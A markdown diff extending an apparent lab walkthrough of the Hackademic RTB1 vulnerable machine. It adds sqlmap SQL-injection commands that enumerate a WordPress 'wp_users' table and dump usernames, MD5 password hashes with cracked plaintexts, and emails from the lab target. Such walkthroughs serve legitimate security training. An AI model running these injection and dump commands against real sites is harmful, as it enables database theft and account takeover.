@@ -98,7 +98,65 @@ Database: wordpress
 +-------------------+
 ```
 
+interesting table would be `wp_users` so let's get information from it :
 
+- Get columns of `wp_users` table :
+
+```bash
+root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress -T wp_users --columns
+
+Database: wordpress
+Table: wp_users
+[22 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(60)         |
+| user_aim            | varchar(50)         |
+| user_browser        | varchar(200)        |
+| user_description    | longtext            |
+| user_domain         | varchar(200)        |
+| user_email          | varchar(100)        |
+| user_firstname      | varchar(50)         |
+| user_icq            | int(10) unsigned    |
+| user_idmode         | varchar(20)         |
+| user_ip             | varchar(15)         |
+| user_lastname       | varchar(50)         |
+| user_level          | int(2) unsigned     |
+| user_login          | varchar(60)         |
+| user_msn            | varchar(100)        |
+| user_nicename       | varchar(50)         |
+| user_nickname       | varchar(50)         |
+| user_pass           | varchar(64)         |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
+| user_yim            | varchar(50)         |
++---------------------+---------------------+
+```
+
+interesting columns would be `user_login`, `user_pass`, `user_level`, `user_email`, let's get those infos :
+
+- Get data from the desired columns :
+
+```bash
+root@kali: sqlmap -u "http://192.168.127.140/Hackademic_RTB1/?cat=1" --batch --dbs -D wordpress -T wp_users -C user_login,user_pass,user_level,user_email --dump
+
+Database: wordpress                                                                                                                                             
+Table: wp_users
+[6 entries]
++--------------+---------------------------------------------+------------+-------------------------+
+| user_login   | user_pass                                   | user_level | user_email              |
++--------------+---------------------------------------------+------------+-------------------------+
+| NickJames    | 21232f297a57a5a743894a0e4a801fc3 (admin)    | 1          | NickJames@hacked.com    |
+| MaxBucky     | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   | 0          | MaxBucky@hacked.com     |
+| GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   | 10         | GeorgeMiller@hacked.com |
+| JasonKonnors | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  | 0          | JasonKonnors@hacked.com |
+| TonyBlack    | a6e514f9486b83cb53d8d932f9a04292 (napoleon) | 0          | TonyBlack@hacked.com    |
+| JohnSmith    | b986448f0bb9e5e124ca91d3d650f52c            | 0          | JohnSmith@hacked        |
++--------------+---------------------------------------------+------------+-------------------------+
+```
 
 
 
